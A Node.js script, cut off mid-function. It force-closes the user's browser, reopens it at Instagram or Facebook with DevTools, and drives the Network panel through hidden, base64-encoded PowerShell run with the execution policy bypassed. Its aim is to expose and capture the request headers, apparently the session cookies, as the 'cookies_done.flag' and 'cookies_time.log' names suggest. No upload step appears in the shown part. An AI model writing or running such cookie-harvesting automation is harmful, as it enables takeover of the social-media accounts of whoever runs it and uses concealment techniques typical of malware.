const { spawn, execFile, execFileSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

// ============================================================
// PLATFORM
// ============================================================

const PLATFORM = process.platform;
const IS_WIN = PLATFORM === 'win32';
const IS_MAC = PLATFORM === 'darwin';
const IS_LINUX = PLATFORM === 'linux';

if (!IS_WIN && !IS_MAC && !IS_LINUX) {
  console.error('Unsupported platform:', PLATFORM);
  process.exit(1);
}

// ============================================================
// PATHS
// ============================================================

const screenshots = path.join(
  os.homedir(),
  'Pictures',
  'Screenshots'
);

const doneFile = path.join(
  os.tmpdir(),
  'cookies_done.flag'
);

fs.mkdirSync(screenshots, { recursive: true });

// ============================================================
// BASIC HELPERS
// ============================================================

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function runDetached(bin, args) {
  try {
    const child = spawn(bin, args, {
      detached: true,
      stdio: 'ignore'
    });

    child.unref();
  } catch {}
}

function runPS(script, hidden = true) {
  const encoded = Buffer
    .from(script, 'utf16le')
    .toString('base64');

  return new Promise((resolve, reject) => {
    const child = spawn(
      'powershell.exe',
      [
        '-NoProfile',
        '-ExecutionPolicy',
        'Bypass',
        '-EncodedCommand',
        encoded
      ],
      {
        windowsHide: hidden,
        stdio: ['ignore', 'pipe', 'pipe']
      }
    );

    let out = '';

    child.stdout.on('data', d => {
      out += d.toString();
    });

    child.stderr.on('data', d => {
      out += d.toString();
    });

    child.on('error', reject);

    child.on('close', code => {
      resolve({
        code,
        out
      });
    });
  });
}

function runPSHiddenDetached(script) {
  const encoded = Buffer
    .from(script, 'utf16le')
    .toString('base64');

  execFile(
    'powershell.exe',
    [
      '-NoProfile',
      '-ExecutionPolicy',
      'Bypass',
      '-EncodedCommand',
      encoded
    ],
    () => {}
  );
}

// ============================================================
// MESSAGE / SCREENSHOT FOLDER
// ============================================================

function showMessage(text, title) {

  if (IS_WIN) {

    const script =
      `Add-Type -AssemblyName System.Windows.Forms; ` +
      `[System.Windows.Forms.MessageBox]::Show(` +
      `'${text.replace(/'/g, "''")}', ` +
      `'${title.replace(/'/g, "''")}', ` +
      `'OK', 'Information') | Out-Null`;

    return runPS(script, false);
  }

  if (IS_MAC) {

    const safe = text
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"');

    runDetached(
      'osascript',
      [
        '-e',
        `display dialog "${safe}" with title "${title}" buttons {"OK"} default button "OK"`
      ]
    );

    return Promise.resolve();
  }

  console.log(`[${title}] ${text}`);
  return Promise.resolve();
}

function openCaptures() {

  if (IS_WIN) {

    runPSHiddenDetached(
      `Start-Process '${screenshots.replace(/'/g, "''")}'`
    );

  } else if (IS_MAC) {

    runDetached('open', [screenshots]);

  } else {

    runDetached('xdg-open', [screenshots]);

  }
}

// ============================================================
// WINDOWS REGISTRY / BROWSER DETECTION
// ============================================================

function regQuery(key, value) {

  try {

    let args = [
      'query',
      key,
      '/v',
      value
    ];

    if (value === '') {
      args = [
        'query',
        key,
        '/ve'
      ];
    }

    const out = execFileSync(
      'reg',
      args,
      {
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'ignore']
      }
    );

    const m = out.match(/REG_SZ\s+(.*)/);

    return m
      ? m[1].trim()
      : null;

  } catch {

    return null;

  }
}

function exeExists(exeName) {

  for (const key of [

    `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\${exeName}`,

    `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\${exeName}`,

    `HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\${exeName}`

  ]) {

    if (regQuery(key, '')) {
      return true;
    }

  }

  return false;
}

function getDefaultBrowserName() {

  const progId = regQuery(
    'HKCU\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice',
    'ProgId'
  );

  if (progId) {

    if (/Firefox/i.test(progId)) {
      return 'firefox';
    }

    if (/ChromeHTML/i.test(progId)) {
      return 'chrome';
    }

    if (/MSEdgeHTM/i.test(progId)) {
      return 'msedge';
    }

    if (/Brave/i.test(progId)) {
      return 'brave';
    }

    if (/Opera/i.test(progId)) {
      return 'opera';
    }
  }

  const browsers = [
    ['chrome', 'chrome.exe'],
    ['msedge', 'msedge.exe'],
    ['firefox', 'firefox.exe'],
    ['brave', 'brave.exe'],
    ['opera', 'opera.exe']
  ];

  for (const [name, exe] of browsers) {

    if (exeExists(exe)) {
      return name;
    }

  }

  return null;
}

function getBrowserExe(name) {

  const exeName = `${name}.exe`;

  for (const key of [

    `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\${exeName}`,

    `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\${exeName}`,

    `HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\${exeName}`

  ]) {

    const p = regQuery(key, '');

    if (p && fs.existsSync(p)) {
      return p;
    }

  }

  try {

    const output = execFileSync(
      'where.exe',
      [exeName],
      {
        encoding: 'utf8'
      }
    );

    const first = output
      .split(/\r?\n/)[0]
      .trim();

    if (first && fs.existsSync(first)) {
      return first;
    }

  } catch {}

  return null;
}

// ============================================================
// LINUX / MAC BROWSER DETECTION
// ============================================================

const LINUX_BIN = {

  chrome: [
    'google-chrome',
    'google-chrome-stable',
    'chromium',
    'chromium-browser'
  ],

  msedge: [
    'microsoft-edge',
    'microsoft-edge-stable'
  ],

  firefox: [
    'firefox'
  ],

  brave: [
    'brave-browser',
    'brave'
  ],

  opera: [
    'opera',
    'opera-stable'
  ]

};

const LINUX_WINDOW_CLASS = {

  chrome: 'chrome',
  msedge: 'microsoft-edge',
  firefox: 'firefox',
  brave: 'brave',
  opera: 'opera'

};

function findBin(names) {

  for (const name of names) {

    try {

      const p = execFileSync(
        'which',
        [name],
        {
          encoding: 'utf8',
          stdio: ['ignore', 'pipe', 'ignore']
        }
      ).trim();

      if (p && fs.existsSync(p)) {
        return p;
      }

    } catch {}

  }

  return null;
}

function getDefaultBrowserNameLinux() {

  try {

    const out = execFileSync(
      'xdg-settings',
      ['get', 'default-web-browser'],
      {
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'ignore']
      }
    );

    const s = out.trim();

    if (/edg/i.test(s)) return 'msedge';
    if (/chrom/i.test(s)) return 'chrome';
    if (/firefox/i.test(s)) return 'firefox';
    if (/brave/i.test(s)) return 'brave';
    if (/opera/i.test(s)) return 'opera';

  } catch {}

  for (const [name, bins] of Object.entries(LINUX_BIN)) {

    if (findBin(bins)) {
      return name;
    }

  }

  return null;
}

function getBrowserExeLinux(name) {
  return findBin(LINUX_BIN[name] || []);
}

const MAC_APPS = {

  chrome: 'Google Chrome',
  msedge: 'Microsoft Edge',
  firefox: 'Firefox',
  brave: 'Brave Browser',
  opera: 'Opera'

};

const MAC_PROCESS = {

  chrome: 'Google Chrome',
  msedge: 'Microsoft Edge',
  firefox: 'firefox',
  brave: 'Brave Browser',
  opera: 'Opera'

};

function getBrowserExeMac(name) {

  const app = MAC_APPS[name];

  if (!app) {
    return null;
  }

  if (
    fs.existsSync(
      path.join(
        '/Applications',
        `${app}.app`
      )
    )
  ) {
    return app;
  }

  return null;
}

function getDefaultBrowserNameMac() {

  for (
    const name of [
      'chrome',
      'firefox',
      'msedge',
      'brave',
      'opera'
    ]
  ) {

    if (getBrowserExeMac(name)) {
      return name;
    }

  }

  return null;
}

// ============================================================
// SITES
// ============================================================

const SITES = {

  instagram: {
    url: 'https://www.instagram.com/instagram/?__a=1',
    rowTail: 'instagram/?__a=1'
  },

  facebook: {
    url: 'https://www.facebook.com/facebook/?__a=1',
    rowTail: 'facebook/?__a=1'
  }

};

function getSiteUsername(site) {

  const m = site.url.match(
    /\.com\/([^/?]+)/
  );

  return m
    ? m[1]
    : site.rowTail.split('/')[0];

}

// ============================================================
// BROWSER LAUNCH
// ============================================================

function launchBrowser(name, exe, site) {

  const url = site.url;

  const devToolsFlag =
    name === 'firefox'
      ? '-devtools'
      : '--auto-open-devtools-for-tabs';

  const extra =
    name && name !== 'firefox'
      ? [
          '--disable-extensions',
          '--no-first-run',
          '--disable-default-apps'
        ]
      : [];

  if (IS_WIN) {

    if (exe) {

      runDetached(
        exe,
        [
          devToolsFlag,
          ...extra,
          url
        ]
      );

    } else {

      runPSHiddenDetached(
        `Start-Process '${url.replace(/'/g, "''")}'`
      );

    }

    return;
  }

  if (IS_MAC) {

    if (exe) {

      runDetached(
        'open',
        [
          '-a',
          exe,
          '--args',
          devToolsFlag,
          ...extra,
          url
        ]
      );

    } else {

      runDetached(
        'open',
        [url]
      );

    }

    return;
  }

  if (exe) {

    runDetached(
      exe,
      [
        devToolsFlag,
        ...extra,
        url
      ]
    );

  } else {

    runDetached(
      'xdg-open',
      [url]
    );

  }

}

// ============================================================
// CLOSE BROWSER
// ============================================================

async function closeBrowser(name) {

  if (IS_WIN) {

    const exeName = `${name}.exe`;

    const promise = runPS(
      `
Get-Process '${exeName}','${name}' -ErrorAction SilentlyContinue |
    Stop-Process -Force -ErrorAction SilentlyContinue

for ($i = 0; $i -lt 20; $i++) {

    $left =
        Get-Process '${exeName}','${name}' -ErrorAction SilentlyContinue

    if (-not $left) {
        break
    }

    $left |
        Stop-Process -Force -ErrorAction SilentlyContinue

    Start-Sleep -Milliseconds 150
}

Get-Process '${exeName}','${name}' -ErrorAction SilentlyContinue |
    Stop-Process -Force -ErrorAction SilentlyContinue
      `,
      true
    );

    await Promise.race([
      promise,
      sleep(5000)
    ]);

    return;
  }

  if (IS_MAC) {

    runDetached(
      'pkill',
      [
        '-f',
        MAC_PROCESS[name] || name
      ]
    );

    return;
  }

  runDetached(
    'pkill',
    [
      '-f',
      LINUX_WINDOW_CLASS[name] || name
    ]
  );

}

// ============================================================
// WINDOWS DEVTOOLS AUTOMATION
// ============================================================

function browserShowScriptFor(
  browserName,
  rowTail,
  shotPath
) {

  const bn = browserName || '';
  const tail = rowTail || '';
  const shot = shotPath || '';

  return `

$browserName = '${bn.replace(/'/g, "''")}'
$rowTail = '${tail.replace(/'/g, "''")}'
$shotPath = '${shot.replace(/'/g, "''")}'

# ============================================================
# LOGGING
# ============================================================

$logFile = Join-Path $env:TEMP 'cookies_time.log'

function Log($text) {

    Add-Content `
        -LiteralPath $logFile `
        -Value (
            (Get-Date -Format 'HH:mm:ss.fff') +
            ' ' +
            $text
        )

}

Log 'START'

# ============================================================
# REQUIRED ASSEMBLIES
# ============================================================

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes

# ============================================================
# WIN32 API
# ============================================================

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;

public static class BrowserWinApi {

    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern bool SetWindowPos(
        IntPtr hWnd,
        IntPtr hWndInsertAfter,
        int X,
        int Y,
        int cx,
        int cy,
        uint uFlags
    );

    [DllImport("user32.dll")]
    public static extern bool GetWindowRect(
        IntPtr hWnd,
        out RECT lpRect
    );

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern uint GetWindowThreadProcessId(
        IntPtr hWnd,
        out uint processId
    );

    [DllImport("user32.dll")]
    public static extern bool EnumWindows(
        EnumWindowsProc lpEnumFunc,
        IntPtr lParam
    );

    [DllImport("user32.dll")]
    public static extern bool IsWindowVisible(
        IntPtr hWnd
    );

    [DllImport("user32.dll")]
    public static extern int GetWindowTextLength(
        IntPtr hWnd
    );

    [DllImport(
        "user32.dll",
        CharSet = CharSet.Unicode
    )]
    public static extern int GetWindowText(
        IntPtr hWnd,
        StringBuilder lpString,
        int nMaxCount
    );

    public delegate bool EnumWindowsProc(
        IntPtr hWnd,
        IntPtr lParam
    );

    public struct RECT {
        public int Left;
        public int Top;
        public int Right;
        public int Bottom;
    }

    private static List<IntPtr> windows =
        new List<IntPtr>();

    private static uint targetPid;

    private static bool Callback(
        IntPtr hWnd,
        IntPtr lParam
    ) {

        uint pid;

        GetWindowThreadProcessId(
            hWnd,
            out pid
        );

        if (
            pid == targetPid &&
            IsWindowVisible(hWnd) &&
            GetWindowTextLength(hWnd) > 0
        ) {

            windows.Add(hWnd);

        }

        return true;
    }

    public static List<IntPtr> GetProcessWindows(
        uint pid
    ) {

        windows =
            new List<IntPtr>();

        targetPid = pid;

        EnumWindows(
            new EnumWindowsProc(Callback),
            IntPtr.Zero
        );

        return windows;
    }

    public static string GetWindowTitle(
        IntPtr hWnd
    ) {

        int len =
            GetWindowTextLength(hWnd);

        if (len <= 0) {
            return "";
        }

        StringBuilder sb =
            new StringBuilder(len + 1);

        GetWindowText(
            hWnd,
            sb,
            sb.Capacity
        );

        return sb.ToString();
    }
}

public static class BrowserMouse {

    [DllImport("user32.dll")]
    private static extern bool SetCursorPos(
        int X,
        int Y
    );

    [DllImport("user32.dll")]
    private static extern void mouse_event(
        uint flags,
        uint dx,
        uint dy,
        uint data,
        UIntPtr extra
    );

    public static void Click(
        int x,
        int y
    ) {

        SetCursorPos(x, y);

        mouse_event(
            0x0002,
            0,
            0,
            0,
            UIntPtr.Zero
        );

        mouse_event(
            0x0004,
            0,
            0,
            0,
            UIntPtr.Zero
        );

    }
}
'@

# ============================================================
# WINDOW HELPERS
# ============================================================

function Get-ProcessWindowHandle($pid) {

    foreach (
        $w in @(
            [BrowserWinApi]::GetProcessWindows(
                [uint32]$pid
            )
        )
    ) {

        try {

            $title =
                [BrowserWinApi]::GetWindowTitle($w)

            if (
                $title -and
                $title -match 'DevTools'
            ) {

                return $w

            }

        } catch {}

    }

    return [IntPtr]::Zero
}

function Get-DevToolsWindowHandle(
    [int]$procId,
    [IntPtr]$main
) {

    $windows =
        [BrowserWinApi]::GetProcessWindows(
            [uint32]$procId
        )

    foreach ($w in @($windows)) {

        if ($w -eq $main) {
            continue
        }

        try {

            $title =
                [BrowserWinApi]::GetWindowTitle($w)

            if ($title -match 'DevTools') {
                return $w
            }

        } catch {}

    }

    foreach ($w in @($windows)) {

        if ($w -eq $main) {
            continue
        }

        try {

            $r =
                New-Object BrowserWinApi+RECT

            [BrowserWinApi]::GetWindowRect(
                $w,
                [ref]$r
            ) | Out-Null

            if (
                $r.Right -gt $r.Left -and
                $r.Bottom -gt $r.Top
            ) {

                return $w

            }

        } catch {}

    }

    return [IntPtr]::Zero
}

function Maximize-Window(
    [IntPtr]$hwnd
) {

    if ($hwnd -eq [IntPtr]::Zero) {
        return
    }

    [BrowserWinApi]::ShowWindow(
        $hwnd,
        3
    ) | Out-Null

    $screen =
        [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

    [BrowserWinApi]::SetWindowPos(
        $hwnd,
        [IntPtr]::Zero,
        $screen.Left,
        $screen.Top,
        $screen.Width,
        $screen.Height,
        0x0040
    ) | Out-Null

}

function Get-WindowElementByHwnd(
    [IntPtr]$hwnd
) {

    if ($hwnd -eq [IntPtr]::Zero) {
        return $null
    }

    $root =
        [System.Windows.Automation.AutomationElement]::RootElement

    $all =
        $root.FindAll(
            [System.Windows.Automation.TreeScope]::Children,
            [System.Windows.Automation.Condition]::TrueCondition
        )

    foreach ($el in $all) {

        try {

            if (
                $el.Current.NativeWindowHandle -
               eq $hwnd.ToInt64()
            ) {

                return $el

            }

        } catch {}

    }

    return $null
}

# ============================================================
# FIND BROWSER PROCESS
# ============================================================

$names =
    @(
        'chrome',
        'msedge',
        'firefox',
        'brave',
        'opera'
    )

if ($browserName) {
    $names = @($browserName)
}

$wsh =
    New-Object -ComObject WScript.Shell

$proc = $null

for (
    $i = 0;
    $i -lt 30 -and -not $proc;
    $i++
) {

    foreach ($n in $names) {

        $p =
            Get-Process $n `
                -ErrorAction SilentlyContinue |
            Where-Object {
                $_.MainWindowHandle -ne 0
            } |
            Select-Object -First 1

        if ($p) {

            $proc = $p
            break

        }

    }

    if (-not $proc) {
        Start-Sleep -Milliseconds 500
    }

}

if (-not $proc) {

    Log 'NO_BROWSER_PROCESS'
    exit 1

}

$mainHwnd =
    $proc.MainWindowHandle

Log "MAIN-HWND=$($mainHwnd.ToInt64())"

# ============================================================
# FOCUS + MAXIMIZE BROWSER
# ============================================================

try {

    $wsh.AppActivate(
        $proc.Id
    ) | Out-Null

} catch {}

Start-Sleep -Milliseconds 300

[BrowserWinApi]::SetForegroundWindow(
    $mainHwnd
) | Out-Null

Start-Sleep -Milliseconds 300

Maximize-Window $mainHwnd

Log 'BROWSER-MAXIMIZED'

# ============================================================
# OPEN DEVTOOLS
# ============================================================

$devOpen = $false

function Test-DevToolsOpen {

    $windows =
        [BrowserWinApi]::GetProcessWindows(
            [uint32]$proc.Id
        )

    foreach ($w in @($windows)) {

        try {

            $title =
                [BrowserWinApi]::GetWindowTitle($w)

            if (
                $title -match 'DevTools' -or
                $title -match 'Developer Tools'
            ) {

                return $true

            }

        } catch {}

    }

    return $false
}

if (Test-DevToolsOpen) {

    $devOpen = $true

}

if (-not $devOpen) {

    try {

        $wsh.AppActivate(
            $proc.Id
        ) | Out-Null

        $wsh.SendKeys('{F12}')

    } catch {}

    Start-Sleep -Milliseconds 1500

}

Log 'DEVTOOLS-OPEN'

# ============================================================
# UNDOCK DEVTOOLS
# ============================================================

$devHwnd =
    Get-DevToolsWindowHandle `
        $proc.Id `
        $mainHwnd

if (
    $devHwnd -eq [IntPtr]::Zero -and
    $browserName -ne 'firefox'
) {

    try {

        [BrowserWinApi]::SetForegroundWindow(
            $mainHwnd
        ) | Out-Null

        Start-Sleep -Milliseconds 300

        $wsh.SendKeys('^+p')

        Start-Sleep -Milliseconds 500

        $wsh.SendKeys('undock')

        Start-Sleep -Milliseconds 300

        $wsh.SendKeys('{ENTER}')

    } catch {}

    Start-Sleep -Milliseconds 1500

    $devHwnd =
        Get-DevToolsWindowHandle `
            $proc.Id `
            $mainHwnd
}

if (
    $devHwnd -eq [IntPtr]::Zero -and
    $browserName -eq 'firefox'
) {

    try {

        [BrowserWinApi]::SetForegroundWindow(
            $mainHwnd
        ) | Out-Null

        $wsh.SendKeys('^+d')

    } catch {}

    Start-Sleep -Milliseconds 1500

    $devHwnd =
        Get-DevToolsWindowHandle `
            $proc.Id `
            $mainHwnd
}

# ============================================================
# FALLBACK: FOREGROUND WINDOW
# ============================================================

if ($devHwnd -eq [IntPtr]::Zero) {

    $fg =
        [BrowserWinApi]::GetForegroundWindow()

    $fgPid = 0

    [BrowserWinApi]::GetWindowThreadProcessId(
        $fg,
        [ref]$fgPid
    ) | Out-Null

    if (
        $fgPid -eq $proc.Id -and
        $fg -ne $mainHwnd
    ) {

        $devHwnd = $fg

    }

}

if ($devHwnd -eq [IntPtr]::Zero) {

    Log 'DEVTOOLS-HWND-NOT-FOUND'

    # We can still attempt to work with the browser window.
    $devHwnd = $mainHwnd

}

Log "DEVTOOLS-HWND=$($devHwnd.ToInt64())"

# ============================================================
# MAXIMIZE DEVTOOLS
# ============================================================

[BrowserWinApi]::SetForegroundWindow(
    $devHwnd
) | Out-Null

Start-Sleep -Milliseconds 300

Maximize-Window $devHwnd

Start-Sleep -Milliseconds 700

$devEl =
    Get-WindowElementByHwnd $devHwnd

Log 'DEVTOOLS-MAXIMIZED'

# ============================================================
# GENERIC PANEL CLICKER
# ============================================================

function Invoke-Panel(
    [string]$PanelName,
    $WindowEl
) {

    if (-not $WindowEl) {
        return $false
    }

    $elements =
        $WindowEl.FindAll(
            [System.Windows.Automation.TreeScope]::Descendants,
            [System.Windows.Automation.Condition]::TrueCondition
        )

    foreach ($el in $elements) {

        try {

            if (
                $el.Current.Name -ieq $PanelName
            ) {

                $type =
                    $el.Current.ControlType

                if (
                    $type -eq
                    [System.Windows.Automation.ControlType]::TabItem -or
                    $type -eq
                    [System.Windows.Automation.ControlType]::Button -or
                    $type -eq
                    [System.Windows.Automation.ControlType]::ListItem
                ) {

                    try {

                        $el.GetCurrentPattern(
                            [System.Windows.Automation.InvokePattern]::Pattern
                        ).Invoke()

                        return $true

                    } catch {}

                    try {

                        $el.GetCurrentPattern(
                            [System.Windows.Automation.SelectionItemPattern]::Pattern
                        ).Select()

                        return $true

                    } catch {}

                }

            }

        } catch {}

    }

    return $false
}

# ============================================================
# OPEN NETWORK
# ============================================================

$devEl =
    Get-WindowElementByHwnd $devHwnd

$networkShown = $false

if ($devEl) {

    $networkShown =
        Invoke-Panel `
            'Network' `
            $devEl

}

if (-not $networkShown) {

    try {

        [BrowserWinApi]::SetForegroundWindow(
            $devHwnd
        ) | Out-Null

        Start-Sleep -Milliseconds 200

        if ($browserName -eq 'firefox') {

            $wsh.SendKeys('^+e')

        } else {

            $wsh.SendKeys('^+p')

            Start-Sleep -Milliseconds 300

            $wsh.SendKeys('network')

            Start-Sleep -Milliseconds 300

            $wsh.SendKeys('{ENTER}')

        }

    } catch {}

}

Start-Sleep -Milliseconds 1200

Log 'NETWORK-OPENED'

# ============================================================
# RELOAD PAGE
# ============================================================

try {

    [BrowserWinApi]::SetForegroundWindow(
        $devHwnd
    ) | Out-Null

    Start-Sleep -Milliseconds 200

    # F5 works from DevTools and causes Network to capture
    # the request again.
    $wsh.SendKeys('{F5}')

} catch {}

Log 'RELOAD-SENT'

# ============================================================
# WAIT FOR NETWORK REQUEST
# ============================================================

Start-Sleep -Milliseconds 2500

# ============================================================
# MOUSE CLICK
# ============================================================

function Invoke-MouseClick($el) {

    if (-not $el) {
        return $false
    }

    try {

        $r =
            $el.Current.BoundingRectangle

        if (
            $r.Width -le 0 -or
            $r.Height -le 0
        ) {

            return $false

        }

        [BrowserMouse]::Click(
            [int]($r.X + ($r.Width / 2)),
            [int]($r.Y + ($r.Height / 2))
        )

        return $true

    } catch {

        return $false

    }

}

# ============================================================
# SELECT NETWORK REQUEST
# ============================================================

function Select-NetworkRow(
    [string]$Name1,
    [string]$Name2,
    $WindowEl
) {

    if (-not $WindowEl) {
        return $false
    }

    $all =
        $WindowEl.FindAll(
            [System.Windows.Automation.TreeScope]::Descendants,
            [System.Windows.Automation.Condition]::TrueCondition
        )

    foreach ($el in $all) {

        try {

            $name =
                $el.Current.Name

            if (
                $name -ieq $Name1 -or
                $name -ieq $Name2
            ) {

                try {

                    $el.GetCurrentPattern(
                        [System.Windows.Automation.InvokePattern]::Pattern
                    ).Invoke()

                    return $true

                } catch {}

                try {

                    $el.GetCurrentPattern(
                        [System.Windows.Automation.SelectionItemPattern]::Pattern
                    ).Select()

                    return $true

                } catch {}

                if (Invoke-MouseClick $el) {

                    return $true

                }

            }

        } catch {}

    }

    # More forgiving fallback.
    # Search partial names because Chromium sometimes adds
    # extra information to the request row's accessible name.

    foreach ($el in $all) {

        try {

            $name =
                $el.Current.Name

            if (
                $name -and
                (
                    $name -like "*$Name1*" -or
                    $name -like "*$Name2*"
                )
            ) {

                if (Invoke-MouseClick $el) {

                    return $true

                }

            }

        } catch {}

    }

    return $false
}

# ============================================================
# FIRST ATTEMPT TO SELECT REQUEST
# ============================================================

$devEl =
    Get-WindowElementByHwnd $devHwnd

$rowName =
    if ($browserName -eq 'firefox') {
        '/' + $rowTail
    } else {
        $rowTail
    }

$rowClicked = $false

if ($devEl) {

    $rowClicked =
        Select-NetworkRow `
            $rowName `
            $rowTail `
            $devEl

}

Log "ROW-FIRST=$rowClicked"

# ============================================================
# RETRY AFTER A SHORT WAIT
# ============================================================

if (-not $rowClicked) {

    Start-Sleep -Milliseconds 1500

    $devEl =
        Get-WindowElementByHwnd $devHwnd

    if ($devEl) {

        $rowClicked =
            Select-NetworkRow `
                $rowName `
                $rowTail `
                $devEl

    }

}

Log "ROW-SECOND=$rowClicked"

# ============================================================
# LAST REQUEST RETRY
# ============================================================

if (-not $rowClicked) {

    try {

        [BrowserWinApi]::SetForegroundWindow(
            $devHwnd
        ) | Out-Null

        $wsh.SendKeys('{F5}')

    } catch {}

    Start-Sleep -Milliseconds 2000

    $devEl =
        Get-WindowElementByHwnd $devHwnd

    if ($devEl) {

        $rowClicked =
            Select-NetworkRow `
                $rowName `
                $rowTail `
                $devEl

    }

}

Log "ROW-FINAL=$rowClicked"

# ============================================================
# WAIT FOR REQUEST DETAILS
# ============================================================

if ($rowClicked) {

    Start-Sleep -Milliseconds 1000

    # IMPORTANT:
    # Selecting a Network request causes DevTools to rebuild
    # the right-side request-details UI.
    #
    # Therefore we ALWAYS obtain a NEW AutomationElement here.
    #
    $devEl =
        Get-WindowElementByHwnd $devHwnd

    Log 'REFRESHED-UI-AFTER-ROW'

}

# ============================================================
# SELECT HEADERS TAB
# ============================================================

function Select-HeadersTab($WindowEl) {

    if (-not $WindowEl) {
        return $false
    }

    $all =
        $WindowEl.FindAll(
            [System.Windows.Automation.TreeScope]::Descendants,
            [System.Windows.Automation.Condition]::TrueCondition
        )

    # Headers is normally already selected.
    # If exposed by UI Automation, explicitly click it.

    foreach ($el in $all) {

        try {

            if (
                $el.Current.Name -ieq 'Headers'
            ) {

                try {

                    $el.GetCurrentPattern(
                        [System.Windows.Automation.SelectionItemPattern]::Pattern
                    ).Select()

                    Start-Sleep -Milliseconds 500

                    return $true

                } catch {}

                try {

                    $el.GetCurrentPattern(
                        [System.Windows.Automation.InvokePattern]::Pattern
                    ).Invoke()

                    Start-Sleep -Milliseconds 500

                    return $true

                } catch {}

                if (Invoke-MouseClick $el) {

                    Start-Sleep -Milliseconds 500

                    return $true

                }

            }

        } catch {}

    }

    return $false
}

$headersClicked = $false

if ($rowClicked) {

    $devEl =
        Get-WindowElementByHwnd $devHwnd

    if ($devEl) {

        $headersClicked =
            Select-HeadersTab $devEl

    }

    # Refresh again because clicking Headers can also rebuild
    # portions of the request-details DOM.

    Start-Sleep -Milliseconds 500

    $devEl =
        Get-WindowElementByHwnd $devHwnd

}

Log "HEADERS-TAB=$headersClicked"

# ============================================================
# FIND + EXPAND REQUEST HEADERS
# ============================================================

function Find-RequestHeaders($WindowEl) {

    if (-not $WindowEl) {
        return $null
    }

    $all =
        $WindowEl.FindAll(
            [System.Windows.Automation.TreeScope]::Descendants,
            [System.Windows.Automation.Condition]::TrueCondition
        )

    foreach ($el in $all) {

        try {

            $name =
                $el.Current.Name

            if (
                $name -and
                $name -match '(?i)^Request headers?(?:\\s*\\(.*\\))?$'
            ) {

                return $el

            }

        } catch {}

    }

    # Some Chromium builds expose extra text after the name.

    foreach ($el in $all) {

        try {

            $name =
                $el.Current.Name

            if (
                $name -and
                $name -match '(?i)^Request headers?'
            ) {

                return $el

            }

        } catch {}

    }

    return $null
}

function Expand-RequestHeaders($WindowEl) {

    if (-not $WindowEl) {
        return $false
    }

    $section =
        Find-RequestHeaders $WindowEl

    if (-not $section) {

        Log 'REQUEST-HEADERS-NOT-FOUND'

        return $false

    }

    Log "REQUEST-HEADERS-ELEMENT=$($section.Current.Name)"

    # --------------------------------------------------------
    # BEST METHOD:
    # ExpandCollapsePattern
    # --------------------------------------------------------

    try {

        $pattern =
            $section.GetCurrentPattern(
                [System.Windows.Automation.ExpandCollapsePattern]::Pattern
            )

        $state =
            $pattern.Current.ExpandCollapseState

        Log "REQUEST-HEADERS-STATE=$state"

        if (
            $state -eq
            [System.Windows.Automation.ExpandCollapseState]::Collapsed
        ) {

            $pattern.Expand()

            Start-Sleep -Milliseconds 700

            Log 'REQUEST-HEADERS-EXPANDED'

            return $true

        }

        if (
            $state -eq
            [System.Windows.Automation.ExpandCollapseState]::Expanded
        ) {

            Log 'REQUEST-HEADERS-ALREADY-EXPANDED'

            return $true

        }

    } catch {

        Log "EXPAND-PATTERN-FAILED=$($_.Exception.Message)"

    }

    # --------------------------------------------------------
    # FALLBACK:
    # Invoke
    # --------------------------------------------------------

    try {

        $section.GetCurrentPattern(
            [System.Windows.Automation.InvokePattern]::Pattern
        ).Invoke()

        Start-Sleep -Milliseconds 700

        Log 'REQUEST-HEADERS-INVOKED'

        return $true

    } catch {

        Log "INVOKE-FAILED=$($_.Exception.Message)"

    }

    # --------------------------------------------------------
    # FALLBACK:
    # SelectionItem
    # --------------------------------------------------------

    try {

        $section.GetCurrentPattern(
            [System.Windows.Automation.SelectionItemPattern]::Pattern
        ).Select()

        Start-Sleep -Milliseconds 700

        Log 'REQUEST-HEADERS-SELECTED'

        return $true

    } catch {

        Log "SELECT-FAILED=$($_.Exception.Message)"

    }

    # --------------------------------------------------------
    # FINAL FALLBACK:
    # REAL MOUSE CLICK
    # --------------------------------------------------------

    if (Invoke-MouseClick $section) {

        Start-Sleep -Milliseconds 700

        Log 'REQUEST-HEADERS-MOUSE-CLICK'

        return $true

    }

    return $false
}

$requestExpanded = $false

if ($rowClicked) {

    # Fresh UI tree.
    $devEl =
        Get-WindowElementByHwnd $devHwnd

    if ($devEl) {

        $requestExpanded =
            Expand-RequestHeaders $devEl

    }

    # If the first attempt failed, refresh and retry once.
    if (-not $requestExpanded) {

        Start-Sleep -Milliseconds 700

        $devEl =
            Get-WindowElementByHwnd $devHwnd

        if ($devEl) {

            $requestExpanded =
                Expand-RequestHeaders $devEl

        }

    }

}

Log "REQUEST-HEADERS-EXPANDED-FINAL=$requestExpanded"

# ============================================================
# SCROLL REQUEST HEADERS INTO VIEW
# ============================================================

function Scroll-RequestHeadersIntoView($WindowEl) {

    if (-not $WindowEl) {
        return $false
    }

    for (
        $attempt = 0;
        $attempt -lt 10;
        $attempt++
    ) {

        $req =
            Find-RequestHeaders $WindowEl

        if (-not $req) {

            return $false

        }

        try {

            $rect =
                $req.Current.BoundingRectangle

            $screen =
                [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea

